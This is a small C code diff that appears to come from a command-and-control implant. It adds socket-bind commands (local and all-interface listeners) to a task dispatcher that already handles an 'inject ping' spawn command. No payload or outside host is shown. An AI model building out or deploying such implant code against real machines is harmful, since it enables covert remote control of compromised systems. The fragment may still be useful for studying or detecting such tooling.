@@ -11,10 +11,19 @@
 #include "self.h"
 #include "spawn.h"
 
+// Localhost for little endian
+#define LOCALHOST 0x0100007f
+
 void TaskDispatch(int cmd, char* buffer, int size)
 {
 	switch (cmd)
 	{
+		case COMMAND_LSOCKET_BIND_LOCALHOST:
+			ChannelLSocketBind(buffer, size, LOCALHOST);
+			break;
+		case COMMAND_LSOCKET_BIND:
+			ChannelLSocketBind(buffer, size, 0);
+			break;
 		case COMMAND_INJECT_PING:
 			SpawnAndPing(buffer, size, TRUE);
 			break;
